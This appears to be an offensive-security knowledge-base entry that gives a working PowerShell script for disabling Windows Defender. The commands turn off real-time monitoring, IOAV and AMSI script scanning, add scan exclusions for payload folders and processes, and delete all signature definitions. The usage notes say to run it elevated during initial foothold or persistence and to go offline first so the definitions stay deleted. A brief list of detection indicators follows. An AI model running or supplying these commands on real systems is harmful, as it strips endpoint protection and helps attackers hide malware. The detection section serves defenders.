---
id: f09e4a3e-86f0-473b-9305-b91d06687c51
name: powershell-impair-windows-defender-script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:26.616426+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - evasion
  - impairment
  - script
validated: true
---

# powershell-impair-windows-defender-script

## Code

```powershell
# Check the status of Windows Defender
PS C:\> Get-MpComputerStatus

# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# Disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# Exclude a folder from Windows Defender scanning
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# Remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Description

This PowerShell script checks Windows Defender status, disables real-time monitoring, IOAV, and AMSI script scanning, adds exclusions for paths and processes, and removes all signature definitions. It is designed for post-exploitation evasion on Windows systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "C:\Temp" | Path to exclude; customize for payload storage | "C:\Tools" |
| "C:\Windows\Tasks" | Additional path exclusion | N/A |
| "word.exe", "vmwp.exe" | Processes to exclude from scanning | "powershell.exe", "cmd.exe" |
| Platform path | Version-specific path to MpCmdRun.exe | Use wildcard * for latest |

## Usage

Execute the entire script in an elevated PowerShell session during initial foothold or persistence setup. Run Get-MpComputerStatus afterward to verify impairments. Use in scenarios where Defender blocks payloads; disconnect from internet before signature removal to prevent auto-update.

## Detection

- PowerShell ScriptBlock logging capturing Set-MpPreference and Add-MpPreference calls.
- Event ID 5001/5007 in Microsoft-Windows-Windows Defender/Operational for preference changes.
- File system monitoring for MpCmdRun.exe executions and signature directory modifications (C:\ProgramData\Microsoft\Windows Defender\Definition Updates).
- EDR alerts on disabled real-time protection.

## Related

- [[procedures/Discover-and-Impair-Windows-Defender-Antivirus]]
